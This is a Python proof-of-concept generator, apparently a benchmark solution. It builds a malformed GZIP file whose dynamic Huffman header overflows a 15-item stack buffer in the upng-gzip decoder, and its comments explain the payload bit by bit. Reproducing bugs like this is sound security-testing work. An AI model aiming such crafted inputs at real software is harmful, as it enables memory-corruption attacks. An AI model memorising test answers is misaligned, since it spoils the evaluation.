import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a stack buffer overflow in upng-gzip where temporary arrays 
        # for Huffman decoding are sized to 15, but the Code Length alphabet can have 19 items.
        # We generate a GZIP file with a dynamic Huffman block specifying HCLEN=14 (18 items).
        # This causes the decoder to write 18 items into a 15-item buffer.
        
        # GZIP Header (10 bytes)
        # ID1=0x1f, ID2=0x8b, CM=8 (Deflate), FLG=0, MTIME=0, XFL=0, OS=0xff
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'
        
        # Deflate Payload (9 bytes)
        # Bits breakdown:
        # 1 bit: BFINAL=1
        # 2 bits: BTYPE=2 (Dynamic Huffman) -> 10 binary (LSB first: 0, 1)
        # 5 bits: HLIT=0 (257 codes) -> 00000
        # 5 bits: HDIST=0 (1 code) -> 00000
        # 4 bits: HCLEN=14 (18 code lengths) -> 1110 binary (LSB first: 0, 1, 1, 1)
        # 54 bits: 18 * 3 bits code lengths (all 0s)
        # 1 bit: Padding (0)
        #
        # Byte construction:
        # Byte 0: 1 (BFINAL) | 0 (BTYPE_0) | 1 (BTYPE_1) | 00000 (HLIT) -> 0x05
        # Byte 1: 00000 (HDIST) | 0 (HCLEN_0) | 1 (HCLEN_1) | 1 (HCLEN_2) -> 0xC0
        # Byte 2: 1 (HCLEN_3) | 0000000 (Code Lengths...) -> 0x01
        # Bytes 3-8: 0x00 (Remaining Code Lengths)
        payload = b'\x05\xc0\x01\x00\x00\x00\x00\x00\x00'
        
        # GZIP Footer (8 bytes)
        # CRC32 (0) + ISIZE (0)
        footer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        
        return header + payload + footer